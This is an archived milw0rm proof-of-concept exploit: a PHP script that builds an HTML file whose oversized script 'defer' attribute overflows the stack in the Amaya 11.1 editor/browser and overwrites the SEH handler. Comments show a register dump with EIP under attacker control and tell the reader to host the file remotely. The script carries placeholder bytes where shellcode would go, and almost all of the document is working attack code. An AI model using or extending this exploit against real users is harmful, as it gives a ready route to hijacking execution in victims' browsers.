<html><head><title>Amaya 11.1 W3C Editor/Browser (defer) Stack Overflow PoC</title></head><pre>&lt;?php

/**//*

     Amaya 11.1 W3C's editor/browser
     Stack Owerflow POC
     Discover by Alfons Luja 
     Thx : OiN 
     select * from friends --
     This stUff overwrite SEH in my box XP home sp 2 
     To correctly overwrite seh you must upload &quot;remote_love.html&quot; to remote server 
     Amaya allow only printable shellcode in this case   
     
     EAX:00000000
     ECX:43434343
     EDX:7C9037D8
     EBX:00000000
     ESP:0012DDD0
     EBP:0012DDF0
     ESI:00000000
     EDI:00000000
     EIP:43434343
     
      
*//**/ 

$junk = &quot;\x41&quot;;
$n_seh = &quot;\x42\x42\x42\x42&quot;;  //pointer to next seh
$h_seh = &quot;\x43\x43\x43\x43&quot;;  //seh handler

for($i=1;$i&lt;7000 - (4*19) - 10;$i++){ $junk.=&quot;\x41&quot;; }

$junk.=$n_seh;
$junk.=$h_seh;
$hello = &quot;&lt;script defer=\&quot;&quot;.$junk.&quot;\&quot;&gt;&quot;;

$hnd = fopen(&quot;remote_love.html&quot;,&quot;w&quot;);
     
       if($hnd){

          fputs($hnd,$hello);
          fclose($hnd);
          echo&quot;DONE !!\n&quot;;
     
       } else {

          echo&quot;Kupa !!\n&quot;;

       }

?&gt;

# milw0rm.com [2009-03-30]</pre></html>